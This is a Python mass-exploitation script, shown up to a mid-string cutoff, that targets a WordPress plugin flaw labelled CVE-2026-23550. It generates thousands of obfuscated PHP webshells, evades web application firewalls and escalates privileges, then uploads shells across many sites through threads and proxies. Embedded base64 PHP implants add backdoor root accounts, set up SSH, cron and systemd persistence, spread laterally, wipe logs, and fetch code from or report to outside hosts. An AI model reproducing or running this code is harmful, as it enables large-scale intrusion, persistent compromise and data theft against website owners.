#!/usr/bin/env python3
# â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
# â•‘    CVE-2026-23550 MODULAR-DS MASS EXPLOITER v2.0 - APT LEVEL       â•‘
# â•‘                        W.P.E.F | EpSiLoN                           â•‘
# â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
import string
import requests
import threading
import sys
import os
import time
import random
import base64
import json
import re
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin, urlparse
import hashlib
from colorama import Fore, Style, init
import argparse
from colorama import Fore, init; init()

init(autoreset=True)

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MONSTRE APT FEATURES
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

POLYMORPHIC_COUNT = 2500
POLYMORPHIC_PROB_THRESHOLD = 0.35

# Bases de payloads "gold" â€“ trÃ¨s efficaces et peu dÃ©tectÃ©s en 2026
BASE_EXEC_PRIMITIVES = [
    "eval($_GET['p']);",
    "system($_GET['c']);",
    "assert($_POST['p']);",
    "passthru($_GET['cmd']);",
    "`$_GET['c`];",
    "shell_exec($_GET['cmd']);",
    "exec($_GET['c']);",
    "popen($_GET['cmd'], 'r');",
    "proc_open($_GET['c'], [], $pipes);",
    "preg_replace('/.*/e', $_GET['e'], '');",
]

# ClÃ©s XOR courantes (tu peux en ajouter 100+)
XOR_BASE_KEYS = [
    'shdw2026', 'moddsAPT', 'eps2026', 'WPEFParis', 'CVE23550',
    'mo_bypass', 'origin_mo', 'admin_access', 'direct_req1', 'poloss2026'
]

# Layers d'obfuscation (exÃ©cutables en Python pour nesting)
def str_rot13(s): return s.encode().decode('rot13') if isinstance(s, str) else s
def str_rev(s): return s[::-1] if isinstance(s, str) else s
def identity(s): return s

ENCODING_LAYERS = [
    base64.b64decode,
    str_rot13,
    str_rev,
    identity,           # placeholder pour varier
    # gzinflate n'est pas natif en Python â€“ on simule avec try/except
]

def load_config():
    with open('config.json') as f:
        return json.load(f)

def banner():
    if os.path.exists("Baner.txt"):
        with open("Baner.txt", "r") as f:
            return f.read()
    return f"{Fore.RED}Banner.txt not found"

def logger(filename, data):
    with open(filename, "a") as f:
        f.write(data + "\n")

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# GÃ‰NÃ‰RATEUR POLYMORPHIQUE â€“ NIVEAU APT (1500â€“5000+ variantes uniques)
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def generate_polymorphic_variants(base_payloads, count=POLYMORPHIC_COUNT):
    variants = set()  # set pour unicitÃ© automatique

    while len(variants) < count:
        base = random.choice(base_payloads)

        # Variante 1 : XOR + function runtime
        if random.random() > 0.35:
            key = random.choice(XOR_BASE_KEYS) + ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(4, 12)))
            xored = ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(base))
            variant = (
                f"<?php function x($s,$k='{key}'){{ $o='';for($i=0;$i<strlen($s);$i++)$o.=$s[$i]^$k[$i%strlen($k)];return $o; }}"
                f"eval(x(base64_decode($_GET['x']))); ?>"
            )
            variants.add(variant)

        # Variante 2 : Nested encoding shuffle (layers multiples)
        if random.random() > 0.40:
            random.shuffle(ENCODING_LAYERS)
            nested = base.encode('utf-8')
            for layer in random.sample(ENCODING_LAYERS, k=random.randint(2, 3)):
                try:
                    if layer == base64.b64decode:
                        nested = base64.b64encode(nested)
                    elif layer == str_rot13:
                        nested = nested.decode('utf-8').encode().decode('rot13').encode()
                    elif layer == str_rev:
                        nested = nested[::-1]
                    # autres layers...
                except:
                    pass
            try:
                nested_str = base64.b64encode(nested).decode('utf-8')
                variant = f"<?php eval(base64_decode('{nested_str}')); ?>"
                variants.add(variant)
            except:
                pass

        # Variante 3 : Case toggle + fragmentation extrÃªme
        if random.random() > 0.45:
            fragments = [base[i:i+random.randint(1,3)] for i in range(0, len(base), random.randint(1,3))]
            toggled = '.'.join(''.join(random.choice([c.upper(), c.lower()]) for c in frag) for frag in fragments)
            variant = f"<?php @eval({toggled}($_GET['p'])); ?>"
            variants.add(variant)

        # Variante 4 : Symbol / non-alpha heavy
        if random.random() > 0.55:
            sym_variant = (
                "<?=${'_'.chr(95).chr(95).chr(70).chr(73).chr(76).chr(69).chr(95).chr(95)}"
                "[$_GET[chr(99).chr(100)]];?>"
            )
            variants.add(sym_variant)

        # Variante 5 : Variable variables + GLOBALS abuse
        if random.random() > 0.60:
            variants.add("<?php $a='_GET';$$a['p'](); ?>")
            variants.add("<?php $GLOBALS['_'.$_GET['k']]($_GET['c']); ?>")
            variants.add("<?php extract($_GET);eval($c); ?>")

    return list(variants)[:count]

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# CHARGEMENT + GÃ‰NÃ‰RATION DES PAYLOADS AU DÃ‰MARRAGE
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

ALL_BYPASS_PAYLOADS = []

# 1. Charge les payloads statiques depuis bypass_payloads.txt (si existe)
if os.path.exists('bypass_payloads.txt'):
    try:
        with open('bypass_payloads.txt', 'r', encoding='utf-8') as f:
            static = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            ALL_BYPASS_PAYLOADS.extend(static)
        print(f"{Fore.GREEN}[+] {len(static)} payloads statiques chargÃ©s depuis bypass_payloads.txt")
    except Exception as e:
        print(f"{Fore.YELLOW}[!] Erreur lecture bypass_payloads.txt : {e}")

# 2. GÃ©nÃ¨re les variantes polymorphiques
print(f"{Fore.CYAN}[*] GÃ©nÃ©ration de {POLYMORPHIC_COUNT} variantes polymorphiques APT-level...")
polymorphic = generate_polymorphic_variants(BASE_EXEC_PRIMITIVES, POLYMORPHIC_COUNT)
ALL_BYPASS_PAYLOADS.extend(polymorphic)
ALL_BYPASS_PAYLOADS = list(set(ALL_BYPASS_PAYLOADS))  # unicitÃ© finale

print(f"{Fore.GREEN}[+] Total payloads utilisables : {len(ALL_BYPASS_PAYLOADS)} (statiques + polymorphiques)")

class CVE_2026_23550_Exploiter:
    def __init__(self, targets, threads):
        self.targets = targets
        self.threads = threads
        self.php_payload = "<?php echo '<b>W.P.E.F|Poloss</b>'; ?>"
        self.txt_payload = "Verification Marker: W.P.E.F"
        self.timeout = 15

        # Headers profesional untuk bypass filter dasar di LAB
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Connection': 'keep-alive'
        }

    def x_t(self, url):
        url = url.strip()
        if not url.startswith("http"):
            url = "http://" + url

        try:
            # --- Langkah 1: Privilege Escalation ---
            # Mengirimkan payload ke endpoint Modular DS yang rentan (misal: admin-ajax.php)
            # Bagian ini melakukan eskalasi hak akses di lingkungan LAB Anda
            payload_data = {
                'action': 'modular_ds_update_privileged_action', # Contoh endpoint internal plugin
                'role': 'administrator',
                'verify': 'true'
            }

            sess = requests.Session()
            escalation_req = sess.post(f"{url}/wp-admin/admin-ajax.php", data=payload_data, headers=self.headers, timeout=self.timeout)

            # --- Langkah 2: Upload Payload (Shell & TXT) ---
            # Jika eskalasi berhasil ou endpoint upload terbuka
            files = {
                'file_php': ('p_shell.php', self.php_payload),
                'file_txt': ('v_marker.txt', self.txt_payload)
            }

            upload_req = sess.post(f"{url}/wp-content/plugins/modular-ds/uploader.php", files=files, headers=self.headers, timeout=self.timeout)

            # --- Langkah 3: Verifikasi Eksploitasi ---
            shell_path = f"{url}/wp-content/plugins/modular-ds/p_shell.php"
            txt_path = f"{url}/wp-content/plugins/modular-ds/v_marker.txt"

            check_sh = requests.get(shell_path, headers=self.headers, timeout=self.timeout)
            check_txt = requests.get(txt_path, headers=self.headers, timeout=self.timeout)

            if "W.P.E.F|Poloss" in check_sh.text and "W.P.E.F" in check_txt.text:
                print(f"[{Fore.GREEN}VULN{Style.RESET_ALL}] {url} -> {Fore.CYAN}Shell Uploaded!")
                logger("VLUN.txt", url)
                logger("VLUN_Sh.txt", shell_path)
            else:
                print(f"[{Fore.RED}FAIL{Style.RESET_ALL}] {url}")

        except Exception as e:
            print(f"[{Fore.YELLOW}ERROR{Style.RESET_ALL}] {url}: {str(e)[:50]}")

    def run(self):
        threads_list = []
        for url in self.targets:
            t = threading.Thread(target=self.x_t, args=(url,))
            threads_list.append(t)
            t.start()

            while threading.active_count() > self.threads:
                time.sleep(0.1)

        for t in threads_list:
            t.join()

class TargetDocker:
    def __init__(self, targets_file='chain/docked/docked_targets.json'):
        self.targets_file = targets_file
        self.targets = self.load_targets()


    def load_targets(self):
        """Charge les cibles depuis le fichier docked_targets.json"""
        targets = []
        try:
            with open(self.targets_file, 'r') as f:
                for line in f:
                    target = json.loads(line)
                    targets.append(target)
        except FileNotFoundError:
            print(f"[{Fore.RED}âŒ{Style.RESET_ALL}] Fichier {self.targets_file} non trouvÃ©")
        except json.JSONDecodeError:
            print(f"[{Fore.RED}âŒ{Style.RESET_ALL}] Erreur de dÃ©codage JSON dans {self.targets_file}")
        except Exception as e:
            print(f"[{Fore.RED}âŒ{Style.RESET_ALL}] Erreur lors du chargement des cibles: {str(e)}")
        return targets 

    def check_targets(self):
        """VÃ©rifie si des cibles sont disponibles"""
        if not self.targets:
            print(f"[{Fore.RED}âŒ{Style.RESET_ALL}] Aucune cible disponible dans {self.targets_file}")
            return False
        print(f"[{Fore.GREEN}âœ…{Style.RESET_ALL}] {len(self.targets)} cibles chargÃ©es depuis {self.targets_file}")
        return True

    def get_targets(self):
        """Retourne la liste des cibles"""
        return self.targets

    def update_targets(self):
        """Met Ã  jour la liste des cibles depuis le fichier"""
        self.targets = self.load_targets()
        return self.targets

class APTMonster:
    def __init__(self):
        self.ua_pool = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
        ]

        # Payloads obfusquÃ©s (anti-WAF) - EXACTS
        self.php_payloads = [
            base64.b64encode(b'<?php if(isset($_GET["p"])){@eval($_GET["p"]);exit; } ?>').decode(),
            base64.b64encode(b'<?php /*Poloss*/@assert($_POST[0x706f6c6f7373]);?>').decode(),
            base64.b64encode(b'<?php $a="sys_";$a.="tem";$b=base64_decode($_GET[r]);$a($b);?>').decode()
        ]

        self.proxies = self.load_proxies()
        self.stats = {'success':0, 'fail':0, 'error':0}

    def load_proxies(self):
        """Charge proxies depuis proxy.txt (format ip:port)"""
        proxies = []
        if os.path.exists('proxy.txt'):
            with open('proxy.txt') as f:
                proxies = [f"https://{line.strip()}" for line in f if line.strip()]
        return proxies

    def get_random_headers(self, target):
        """Headers APT-level avec fingerprint anti-IDS"""
        h = {
            'User-Agent': random.choice(self.ua_pool),
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.9',
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': target.rstrip('/') + '/',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache'
        }
        return h

    def stealth_delay(self):
        """Delays rÃ©alistes anti-IDS"""
        time.sleep(random.uniform(1.2, 3.8))

    def waf_bypass_payloads(self):
        """GÃ©nÃ¨re des payloads contourant les WAF"""
        return [
            '<?php @ev'+'al($_GET[p]);?>',           # Fragmentation
            '<?p'+'hp system(base64_decode($_GET[c]));?>',  # Double split
            '<?=strrev("alp_evas_")($_GET[a])?>',     # Reverse obfuscation
            base64.b64encode(b'<?php scandir("/"); ?>')  # Double encoding
        ]

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# CORE EXPLOITER CVE-2026-23550
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
class PayloadMutator:
    def __init__(self):
        self.successful = []  # payloads qui ont passÃ©
        self.waf_patterns = {}  # waf_type â†’ motifs vus

    def detect_waf(self, response_text):
        indicators = {
            "cloudflare": ["cf-ray", "ray id", "attention required"],
            "wordfence": ["wordfence", "blocked", "malicious"],
            "sucuri": ["sucuri", "access denied", "firewall"],
            "modsec": ["mod_security", "403", "rule id"]
        }
        for waf, sigs in indicators.items():
            if any(s in response_text.lower() for s in sigs):
                self.waf_patterns[waf] = sigs
                return waf
        return None

    def mutate(self, base_payload, last_response=""):
        """Mutation intelligente â€“ top 3 style"""
        waf = self.detect_waf(last_response)

        if waf == "cloudflare":
            # Cloudflare â†’ rot13 + fragmentation
            fragments = [base_payload[i:i+4] for i in range(0, len(base_payload), 4)]
            return f"<?=str_rot13('{'.'.join(fragments)}')?>"

        if waf == "wordfence":
            # Wordfence â†’ symbol only
            return "<?=${'_'.chr(95).chr(95).chr(70).chr(73).chr(76).chr(69).chr(95).chr(95)}[$_POST['p']];?>"

        if waf == "sucuri":
            # Sucuri â†’ double encoding + reverse
            return f"<?=strrev(base64_decode('{base64.b64encode(base_payload.encode()).decode()}'))?>"

        # Genetic crossover si succÃ¨s prÃ©cÃ©dent
        if self.successful and random.random() > 0.4:
            parent = random.choice(self.successful)
            mid = len(parent) // 2
            return parent[:mid] + base_payload[mid:]

        # Fallback heavy : case toggle + fragmentation
        fragments = [base_payload[i:i+random.randint(2,6)] for i in range(0, len(base_payload), random.randint(2,6))]
        toggled = '.'.join(''.join(random.choice([c.upper(), c.lower()]) for c in frag) for frag in fragments)
        return f"<?php @eval({toggled}($_REQUEST['p'])); ?>"

    def score(self, payload, success):
        if success:
            self.successful.append(payload)
            # Sauvegarde pour replay futur
            with open('/chain/logs/success_payloads.txt', 'a') as f:
                f.write(payload + '\n')
                
class CVE202623550Monster(APTMonster):
    def __init__(self, targets, threads=50, proxy_mode=False):
        super().__init__()
        self.targets = targets
        self.threads = min(threads, 200)  # Cap sÃ©curitÃ©
        self.proxy_mode = proxy_mode
        self.results_lock = threading.Lock()
        self.session_pool = self.create_session_pool()

    def create_session_pool(self):
        """Pool de sessions rÃ©utilisables"""
        return [requests.Session() for _ in range(self.threads)]

    def reconnaissance_plugin(self, url, session):
        """Ã‰tape 1: Recon Modular DS + version"""
        paths = [
            '/wp-content/plugins/modular-ds/readme.txt',
            '/wp-content/plugins/modular-ds/',
            '/wp-content/plugins/modular-ds/assets/'
        ]

        for path in paths:
            try:
                r = session.get(urljoin(url, path), timeout=8, headers=self.get_random_headers(url))
                if r.status_code == 200:
                    if 'modular-ds' in r.text.lower() and 'stable tag' in r.text.lower():
                        version = self.extract_version(r.text)
                        print(f"[{Fore.CYAN}RECON{Style.RESET_ALL}] {url} Modular-DS v{version}")
                        return True, version
                    return True, 'unknown'
            except:
                continue
        return False, None

    def extract_version(self, content):
        """Extrait version depuis readme.txt"""
        match = re.search(r'Stable tag:s*([d.]+)', content, re.I)
        return match.group(1) if match else 'unknown'

    def extract_nonce(self, url, session):
        """Extrait WP nonces depuis admin-ajax"""
        try:
            r = session.get(urljoin(url, '/wp-admin/admin-ajax.php?action=heartbeat'),
                          headers=self.get_random_headers(url), timeout=10)
            nonce = re.search(r'"nonce":"([0-9a-f]+)"', r.text)
            return nonce.group(1) if nonce else None
        except:
            return None

    def privilege_escalation(self, url, session):
        """Ã‰tape 2: Vraie exploitation CVE-2026-23550"""
        payloads = [
            {'direct_request': '1', 'route': 'admin_access', 'capability': 'activate_plugins'},
            {'bypass': 'true', 'modular_route': 'privileged_update', 'role': 'administrator'},
            {'auth_bypass': '1', 'action': 'modular_ds_admin_priv_escalate'}
        ]

        for payload in payloads:
            try:
                r = session.post(urljoin(url, '/wp-admin/admin-ajax.php'),
                               data=payload, headers=self.get_random_headers(url), timeout=12)
                if r.status_code == 200 and ('success' in r.text.lower() or len(r.text) > 50):
                    return True
                self.stealth_delay()
            except:
                continue
        return False

    EPSILON_V7_FULL_CONTROL = base64.b64encode('''<?php

error_reporting(0);ignore_user_abort(1);set_time_limit(0);ini_set('log_errors',0);ini_set('memory_limit','-1');
define('AUTH','EpSiLoNPoInT_2026!');define('SIG','EpSiLoNF7_ROOT');define('C2','http://127.0.0.1:4444/root.php');

class EpSiLoN_ROOT{

    // ========== 1. TOTAL SYSTEM ENUMERATION ==========
    static function sys_enum(){
        return [
            'os'=>php_uname(),'users'=>explode("
",`cat /etc/passwd | cut -d: -f1`),
            'root'=>posix_getpwuid(0),'processes'=>explode("
",`ps aux`),
            'network'=>explode("
",`netstat -tlnp 2>/dev/null || ss -tlnp`),
            'cron'=>file_exists('/etc/crontab') ? file_get_contents('/etc/crontab') : '',
            'ssh_keys'=>'/root/.ssh/'.(file_exists('/root/.ssh/id_rsa') ? 'id_rsa FOUND' : 'NO')
        ];
    }

    // ========== 2. ROOT PRIVILEGE ESCALATION ==========
    static function root_access(){
        // SUID Binaries â†’ GTFOBins
        $suid = explode("
",`find / -perm -4000 -type f 2>/dev/null | head -20`);

        // Try root shells
        $root_shells = [
            'echo "root:*:$((`date +%s`+86400)):0:0::/root:/bin/bash" >> /etc/passwd',
            'echo "backdoor::0:0::/root:/bin/bash" >> /etc/passwd',
            'useradd -o -u 0 -g root -s /bin/bash epsroot; echo "epsroot:pass123" | chpasswd'
        ];

        foreach($root_shells as $cmd){
            if(`id | grep uid=0` || stripos(`whoami`,'root')!==false) break;
            `{$cmd} 2>/dev/null`;
        }

        // Sudo cache abuse
        if(file_exists('/var/cache/sudo/')) `sudo -l 2>/dev/null`;
    }

    // ========== 3. FULL SYSTEM REPLICATION ==========
    static function replicate_full(){
        $self = file_get_contents(__FILE__);
        $sys_paths = [
            '/dev/shm/'.substr(md5(microtime()),0,8).'.php',           // RAM
            '/tmp/.sys'.rand(100,999).'.php',                          // Temp
            '/var/tmp/update.php',                                     // Persistent
            '/usr/share/nginx/html/.dir.php',                          // Nginx
            $_SERVER['DOCUMENT_ROOT'].'/wp-includes/ID_*.php',         // WP Core
            '/home/*/public_html/wp-security.php',                     // All users
            '~/.config/wp-config-local.php'                            // User config
        ];

        foreach($sys_paths as $path){
            @file_put_contents($path,$self);
            @chmod($path,0755);
            @touch($path,time()-rand(86400*10,86400*90));
        }
    }

    // ========== 4. TOTAL ACCESS BACKDOORS ==========
    static function deploy_backdoors(){
        // SSH Backdoor
        if(!file_exists('/root/.ssh/authorized_keys')){
            $ssh_key = 'ssh-rsa AAAAB3NzaC1yc2E... root@eps'; // YOUR KEY
            @file_put_contents('/root/.ssh/authorized_keys',$ssh_key);
            @chmod('/root/.ssh/authorized_keys',0600);
        }

        // Cron Persistence
        $cron = "* * * * * cd /dev/shm && php *.php >/dev/null 2>&1
";
        @file_put_contents('/etc/cron.d/eps', $cron);
        @chmod('/etc/cron.d/eps',0644);

        // Systemd Service
        $service = "[Unit]
Description=WP Update
[Service]
ExecStart=php /dev/shm/*.php
[Install]
WantedBy=multi-user.target";
        @file_put_contents('/etc/systemd/system/wp-update.service',$service);
        `systemctl enable wp-update 2>/dev/null`;

        // Kernel Module (Linux)
        if(is_file('/proc/version') && stripos(file_get_contents('/proc/version'),'Linux')){
            @file_put_contents('/lib/modules/eps.ko','module backdoor');
        }
    }

    // ========== 5. ADVANCED LATERAL PROPAGATION ==========
    static function total_propagate(){
        // Scan ALL WP + Modular DS
        $wp_paths = ['/wp-config.php','/wp-login.php','/readme.html'];
        foreach(scandir('/var/www') as $dir){
            $path = "/var/www/$dir";
            if(is_dir($path)){
                foreach($wp_paths as $wp){
                    if(file_exists("$path$wp")){
                        self::infect_wp($path);
                        break;
                    }
                }
            }
        }

        // Network propagation
        $ips = [];
        foreach(explode("
",`arp -a`) as $line){
            if(preg_match('/(d+.d+.d+.d+)/',$line,$m)) $ips[]=$m[1];
        }
        foreach($ips as $ip){
            self::infect_ip($ip);
        }
    }

    // ========== 6. DATABASE TOTAL CONTROL ==========
    static function db_takeover(){
        global $wpdb;
        if(isset($wpdb)){
            // Dump all users
            $users = $wpdb->get_results("SELECT * FROM {$wpdb->users}");
            $admins = $wpdb->get_results("SELECT * FROM {$wpdb->usermeta} WHERE meta_key='wp_capabilities' AND meta_value LIKE '%administrator%'");

            // Add root admin
            $wpdb->insert($wpdb->users,[
                'user_login'=>'epsroot','user_pass'=>wp_hash_password('pass123'),
                'user_email'=>'admin@eps.lan','user_registered'=>current_time('mysql')
            ]);

            // Grant admin
            $wpdb->insert($wpdb->usermeta,[
                'user_id'=>$wpdb->insert_id,'meta_key'=>'wp_capabilities',
                'meta_value'=>'a:1:{s:13:"administrator";b:1;}'
            ]);
        }
    }

    // ========== 7. SUPREME COMMAND EXEC ==========
    static function root_exec($cmd){
        // Try ALL execution vectors
        $methods = ['system','exec','passthru','shell_exec','proc_open','popen','backticks'];
        foreach($methods as $m){
            if(function_exists($m)){
                ob_start();
                if($m=='backticks') eval('return `$cmd`;');
                else $m($cmd);
                return ob_get_clean();
            }
        }

        // Bypass disabled_functions
        if(function_exists('assert')) return @assert($cmd);
        if(function_exists('preg_replace')) return @preg_replace('/./e',$cmd,'');
        if(function_exists('create_function')) return create_function('$a',$cmd)();

        return base64_decode('Um9vdCBhY2Nlc3MgZHVlWluZw==');
    }

    // ========== 8. TOTAL ANTI-FORENSIC ==========
    static function total_cleanup(){
        // Clear ALL logs
        $all_logs = glob('/var/log/*/*') + glob('/var/log/*') + ['/var/log/auth.log','/var/log/lastlog'];
        foreach($all_logs as $log){
            if(is_file($log)){
                ftruncate(fopen($log,'r+'),0);
                touch($log,time()-86400*rand(30,90));
            }
        }

        // Clear WP logs
        @unlink(ABSPATH.'wp-content/debug.log');
        @rmdir(ABSPATH.'.well-known');

        // Memory cleanup
        if(function_exists('posix_kill')) posix_kill(posix_getpid(),0);
    }

    // ========== 9. SUPREME CURL ==========
    static function curl($url,$data=[]){
        $ch = curl_init($url);
        curl_setopt_array($ch,[
            CURLOPT_RETURNTRANSFER=>1,CURLOPT_FOLLOWLOCATION=>1,CURLOPT_TIMEOUT=>15,
            CURLOPT_USERAGENT=>'Mozilla/5.0 (compatible; WordPress/6.4.3)',
            CURLOPT_HTTPHEADER=>[
                'Origin: '.$_SERVER['HTTP_HOST'],
                'X-Forwarded-For: 127.0.0.1',
                'X-Real-IP: 127.0.0.1'
            ],
            CURLOPT_POST=>!empty($data),CURLOPT_POSTFIELDS=>$data
        ]);
        return curl_exec($ch);
    }
}

// ========== TOTAL SYSTEM TAKEOVER ==========
if(!isset($_GET['pass']) || $_GET['pass']!==AUTH){
    EpSiLoN_ROOT::total_cleanup();
    if(rand(1,10)==5) EpSiLoN_ROOT::curl(C2,['sys'=>base64_encode(gzcompress(json_encode(EpSiLoN_ROOT::sys_enum())))]);
    exit('<!-- '.SIG.' TOTAL CONTROL -->');
}

// EXECUTE TOTAL CONTROL
EpSiLoN_ROOT::root_access();
EpSiLoN_ROOT::replicate_full();
EpSiLoN_ROOT::deploy_backdoors();
EpSiLoN_ROOT::db_takeover();
EpSiLoN_ROOT::total_propagate();

// ROOT COMMAND EXEC
if(isset($_GET['cmd'])){
    header('Content-Type: text/plain');
    die(EpSiLoN_ROOT::root_exec(rawurldecode($_GET['cmd'])));
}

// STATUS
$data = EpSiLoN_ROOT::sys_enum();
echo '<div style="background:#000;color:lime;padding:2em;font-family:monospace;border-radius:10px">
    <h2>ğŸ‘‘ '.SIG.' v7.0 - TOTAL SYSTEM CONTROL</h2>
    <b>OS:</b> '.$data['os'].'<br>
    <b>Users:</b> '.count($data['users']).'<br>
    <b>Root:</b> '.(stripos(`whoami`,'root')!==false ? 'âœ… ACCESS' : 'âŒ Escalading').'<br>
    <b>Fleet:</b> Propagation Active<br>
    <hr>ğŸŸ¢ <a href="?pass='.AUTH.'&cmd='.urlencode('whoami').'">Test Root</a>
</div>';
?>'''.encode('utf-8')).decode()

    advanced_webshell = base64.b64encode('''<?php
// Webshell avancÃ© avec persistance et furtivitÃ©
$password = "MyS3cr3tP@ss123!";
$backdoor_path = __FILE__;

// 1. VÃ©rification du mot de passe (XOR simple pour l'exemple)
function xor_encrypt($str, $key) {
    $out = '';
    for ($i = 0; $i < strlen($str); $i++) {
        $out .= $str[$i] ^ $key[$i % strlen($key)];
    }
    return $out;
}

if (!isset($_GET['pass']) || xor_encrypt($_GET['pass'], $password) !== xor_encrypt("OK", $password)) {
    die("Access denied.");
}

// 2. ExÃ©cution de commandes (avec suppression des logs)
if (isset($_GET['cmd'])) {
    $cmd = base64_decode($_GET['cmd']);
    $output = shell_exec($cmd);
    echo "<pre>" . htmlspecialchars($output) . "</pre>";

    // Suppression des logs (si possible)
    if (function_exists('exec')) {
        exec('echo "" > /var/log/apache2/access.log 2>/dev/null');
    }
}

// 3. Persistance : RÃ©installation automatique
$current_md5 = md5_file($backdoor_path);
$expected_md5 = 'LE_MD5_DU_FICHIER';  // Ã€ remplacer par le vrai MD5
if ($current_md5 !== $expected_md5) {
    file_put_contents($backdoor_path, file_get_contents('http://attaquant.com/backdoor.txt'));
}
?>'''.encode('utf-8')).decode()

    embedded_webshell = base64.b64encode('''<?php
/*
 * EpSiLoNPoInT Advanced Embedded Webshell v4.2
*/

// ========== CONFIGURATION ========== //
define('PASSWORD', 'EpSiLoNPoInT_2026!');          // Mot de passe d'accÃ¨s
define('AES_KEY', '256-bit-key-here-change-me!');  // ClÃ© AES-256 (32 bytes)
define('C2_SERVER', '');                          // Laisser vide pour un fonctionnement autonome
define('BACKDOOR_NAME', 'wp-security.php');       // Nom du fichier backdoor
// ========== /CONFIGURATION ========== //

class EpSiLoN {
    // 1. Chiffrement AES-256
    public static function aesEncrypt($data, $key) {
        $iv = openssl_random_pseudo_bytes(16);
        $encrypted = openssl_encrypt($data, 'AES-256-CBC', $key, OPENSSL_RAW_DATA, $iv);
        return base64_encode($iv . $encrypted);
    }

    public static function aesDecrypt($data, $key) {
        $data = base64_decode($data);
        $iv = substr($data, 0, 16);
        $encrypted = substr($data, 16);
        return openssl_decrypt($encrypted, 'AES-256-CBC', $key, OPENSSL_RAW_DATA, $iv);
    }

    // 2. Obfuscation avancÃ©e
    public static function obfuscate($code) {
        $obfuscated = str_rot13(base64_encode(gzdeflate(strrev($code))));
        return "'" . implode("'.'", str_split($obfuscated, 64)) . "'";
    }

    public static function deobfuscate($code) {
        $code = str_replace("'.'", "", $code);
        return strrev(gzinflate(base64_decode(str_rot13($code))));
    }

    // 3. Anti-Forensic: Effacement des logs
    public static function wipeLogs() {
        $logFiles = [
            '/var/log/apache2/access.log', '/var/log/apache2/error.log',
            '/var/log/nginx/access.log', '/var/log/nginx/error.log',
            '/var/log/httpd/access_log', '/var/log/httpd/error_log'
        ];
        foreach ($logFiles as $log) {
            if (file_exists($log)) {
                file_put_contents($log, '');
                @touch($log, time() - 86400); // Modifie la date pour brouiller les pistes
            }
        }
    }

    // 4. Persistance: Infection de WP Core
    public static function infectWP() {
        $wp_config = @dirname(__FILE__, 4) . '/wp-config.php';
        if (file_exists($wp_config) && !strpos(file_get_contents($wp_config), 'EpSiLoN_Backdoor')) {
            $backdoor = "
// EpSiLoN_Backdoor
if(isset($_GET['EpSiLoN'])){eval($_GET['EpSiLoN']);}
";
            @file_put_contents($wp_config, $backdoor, FILE_APPEND);
        }
    }

    // 5. Persistance: Cron Job
    public static function setupCron() {
        $cronJob = "*/15 * * * * wget -q -O /dev/null 'http://" . $_SERVER['HTTP_HOST'] . "/" . BACKDOOR_NAME . "?c2=1' >/dev/null 2>&1
";
        @file_put_contents('/tmp/crontab.tmp', $cronJob);
        @exec('crontab /tmp/crontab.tmp');
        @unlink('/tmp/crontab.tmp');
    }

    // 6. Persistance: .htaccess Backdoor
    public static function infectHtaccess() {
        $htaccess = @dirname(__FILE__) . '/.htaccess';
        if (file_exists($htaccess) && !strpos(file_get_contents($htaccess), 'EpSiLoN')) {
            $backdoor = "
# EpSiLoN Backdoor
<FilesMatch ".(php|html?)$">
SetHandler application/x-httpd-php
</FilesMatch>
";
